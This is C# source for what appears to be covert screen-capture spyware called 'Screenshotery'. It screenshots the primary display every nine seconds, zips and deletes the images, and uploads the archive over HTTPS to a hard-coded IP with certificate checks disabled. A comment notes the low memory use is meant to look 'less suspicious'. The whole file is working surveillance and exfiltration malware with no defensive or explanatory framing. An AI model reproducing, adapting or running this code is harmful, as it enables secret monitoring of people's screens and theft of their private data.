using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using Ionic.Zip;
using System.IO;
using System.Net;

namespace Screenshotery
{ 
    public class Screenshot
    {
        static void CaptureScreen(string picnum)
        {
            //keep sequential list of screenshots
            string filename = "C:/Users/xxxxx/Desktop/screenshottery/pic" + picnum + ".png";
            
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                bmp.Save(filename);
            }
            
        }

        static void CompressPic()
        {
            using (ZipFile zip = new ZipFile())
            {
                zip.AddDirectory(@"C:/Users/xxxxx/Desktop/screenshottery/");
                zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                zip.Comment = "This zip was created at " + System.DateTime.Now.ToString("G");
                zip.Save(string.Format("test.zip"));
            }
        }

        static void EraseFiles()
        {
            System.IO.DirectoryInfo di = new DirectoryInfo("C:/Users/xxxxxx/Desktop/screenshottery/");
            foreach (FileInfo file in di.GetFiles())
            {
                file.Delete();
            }
        }

        static void SendFile()
        {
            WebClient webClient = new WebClient();
            string webAddress = null;
            string logFileName = "C:/Users/xxxx/source/repos/screenshottery/screenshottery/bin/Debug/test.zip";
            try
            {
                webAddress = @"https://192.168.60.128:443/";
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
                webClient.Credentials = CredentialCache.DefaultCredentials;

                WebRequest serverRequest = WebRequest.Create(webAddress);
                WebResponse serverResponse;
                serverResponse = serverRequest.GetResponse();
                serverResponse.Close();

                webClient.UploadFile(webAddress, "POST", logFileName);
                webClient.Dispose();
                webClient = null;
            }
            catch (Exception error)
            {
                MessageBox.Show(error.Message);
            }
        }

        static void Main(string[] args)
        {
            int i = 0;
            while (true)
            {
                i++;
                string picnum = i.ToString();
                CaptureScreen(picnum);
                
                if (i % 5 == 0)
                {
                    CompressPic();
                    EraseFiles();
                    SendFile();
                }
              
                //use thread.sleep and garbage collector to prevent memory getting to high 
                //this should keep it at constant low memory and low power (less suspicious)
                Thread.Sleep(9000);
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();
                  
            }
        }
    }
}


//https://github.com/HackLikeAPornstar/GibsonBird/blob/master/chapter5/simpleHTTPsUpload.py#L104
// https://stackoverflow.com/questions/11980779/upload-file-to-https-webserver-using-c-sharp-client
//https://stackoverflow.com/questions/10822509/the-request-was-aborted-could-not-create-ssl-tls-secure-channel


